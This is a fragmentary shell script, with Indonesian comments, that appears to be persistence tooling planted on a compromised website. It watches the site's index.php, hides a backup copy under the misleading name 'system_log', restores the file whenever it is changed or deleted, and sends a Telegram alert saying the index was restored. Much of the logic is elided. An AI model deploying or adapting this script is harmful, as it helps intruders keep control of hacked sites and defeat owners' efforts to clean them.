...
INDEX_FILE="/home/abrahamf/climatechangehumanhealth.org/index.php" #<<<file directory name.php
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/home/abrahamf/climatechangehumanhealth.org/" #<<<folder directory backup
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup Permissions 755
BACKUP_FILE="$BACKUP_FOLDER/system_log" #<<<Name file backup
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "https://www.climatechangehumanhealth.org/" #<<<url 
            send_telegram_notification "index di hapus. SUDAH DI KEMBALIKAN." #<<< di hapus nama file  #<<< notic dikembalikan
        fi
